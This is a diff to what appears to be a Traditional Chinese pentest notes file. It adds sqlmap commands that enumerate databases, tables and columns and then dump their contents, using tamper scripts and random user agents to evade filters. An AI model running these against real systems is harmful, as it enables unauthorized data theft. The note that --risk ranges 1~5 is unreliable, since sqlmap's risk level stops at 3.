@@ -97,5 +97,14 @@
   - SQLmap
     - **指令**
       ```sh
+      #可以dump出所有資料庫名稱
       sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash --dbs
+      #可以dump某一資料庫的資料表
+      sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash -D dbs名稱 --tables
+      #可以dump出某一資料庫、資料表的欄位
+      sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash -D dbs名稱 -T tb名稱 --columns
+      #可以dump出某一資料庫、資料表的欄位內容
+      sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash -D dbs名稱 -T tb名稱 -C c欄,c欄 --dump
+      #其他參數
+      --delay 1（延遲一秒）、--level 1~5、--risk 1~5（更多注入手段會更久）
       ```
